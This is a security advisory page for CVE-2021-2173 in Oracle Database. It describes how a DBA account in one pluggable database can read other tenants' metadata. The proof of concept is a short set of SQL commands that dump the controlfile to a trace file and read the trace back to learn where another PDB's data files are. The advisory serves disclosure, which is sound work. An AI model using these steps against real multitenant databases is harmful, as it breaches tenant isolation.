---
title: Oracle DB Broken PDB Isolation / Metadata Exposure
url: https://cxsecurity.com/issue/WLB-2023030038
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-16
fetch_date: 2025-10-04T09:43:51.382786
---

# Oracle DB Broken PDB Isolation / Metadata Exposure

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle DB Broken PDB Isolation / Metadata Exposure** **2023.03.15**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-2173](https://cxsecurity.com/cveshow/CVE-2021-2173/ "Click to see CVE-2021-2173")**  CWE: **[NVD-CWE-noinfo](https://cxsecurity.com/cwe/NVD-CWE-noinfo "NVD-CWE-noinfo")**  CVSS Base Score: **4/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **Single time**  Confidentiality impact: **Partial**  Integrity impact: **None**  Availability impact: **None** | |

Title: CVE-2021-2173 – PDB Isolation is broken through metadata exposure
Product: Database
Manufacturer: Oracle
Affected Version(s): 12.1.0.2, 12.2.0.1, 18c, 19c
Tested Version(s): 19c
Risk Level: Medium
Solution Status: Fixed
CVE Reference: CVE-2021-2173
Author of Advisory: Emad Al-Mousa
Overview:
Oracle CDB Architecture was introduced in Oracle starting from 12cR1 as a shift in their architecture to adopt Multitenancy approach for Cloud infrastructure deployment. As any other new architecture, security issues/vulnerabilities can take place. In this vulnerability I am going to show that from PDB level with account granted DBA role I can extract metadata information of other pluggable databases within the same container.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
attacker in a pluggable database can exfiltrate metdata info. for other co-existing databases within the same container.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
I will create account called “ironman” in PDB1:
sqlplus / as sysdba
SQL> alter session set container=PDB1;
SQL> create user ironman identified by ironman\_2021;
SQL> grant create session to ironman;
SQL> grant dba to ironman;
SQL> alter user ironman default role all;
SQL> exit;
Then, I will connect using ironman to PDB1 and execute the following:
// dumping controlfile contents
SQL> alter session set events 'immediate trace name controlf level 4';
SQL> select \* from v$diag\_info where NAME='Default Trace File';
SQL> select payload from V$DIAG\_TRACE\_FILE\_CONTENTS where TRACE\_FILENAME='ORCLCDB\_ora\_7387.trc';
After Inspecting the output, for example we can now know the location of SYSTEM data file for PDB2 database within the same container in addition to other information.
So, from PDB1 the attacker will be able to view the metadata information of other customer’s PDB’s within the same container, this should not be happening in the first place as ISOLATION should be enforced !
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpuapr2021.html
https://nvd.nist.gov/vuln/detail/CVE-2021-2173
https://databasesecurityninja.wordpress.com/2021/06/04/cve-2021-2173-pdb-isolation-is-broken-through-metadata-exposure/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030038)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top